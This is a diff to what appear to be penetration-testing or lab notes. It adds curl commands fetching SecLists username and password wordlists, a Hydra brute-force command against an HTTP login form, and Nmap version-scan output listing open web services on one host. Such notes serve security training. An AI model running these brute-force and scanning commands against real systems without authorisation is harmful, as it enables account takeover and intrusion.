@@ -9,3 +9,32 @@ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/User
  curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt
 # Hydra command
 hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
+
+
+┌─[user@parrot]─[~/Downloads]
+└──╼ $nmap -sV -p 4240,9962,10256,30204,30253,30265,30416,30469,30548,30564,30570,30726,30783,30848,30895,30902,30943,30986,31156,31212 94.237.58.110
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-30 01:29 UTC
+Nmap scan report for 94-237-58-110.uk-lon1.upcloud.host (94.237.58.110)
+Host is up (0.27s latency).
+
+PORT      STATE SERVICE     VERSION
+4240/tcp  open  daap        mt-daapd DAAP
+9962/tcp  open  http        Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+10256/tcp open  http        Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+30204/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
+30253/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
+30265/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
+30416/tcp open  http        nginx 1.19.2
+30469/tcp open  http        Node.js (Express middleware)
+30548/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
+30564/tcp open  http        nginx 1.19.2
+30570/tcp open  ssl/unknown
+30726/tcp open  http        Werkzeug httpd 2.0.0 (Python 3.8.15)
+30783/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
+30848/tcp open  http        nginx 1.19.2
+30895/tcp open  http        Node.js (Express middleware)
+30902/tcp open  http        Apache httpd 2.4.62 ((Debian))
+30943/tcp open  http        nginx 1.26.1
+30986/tcp open  http        nginx 1.19.2
+31156/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
+31212/tcp open  http        nginx 1.19.2
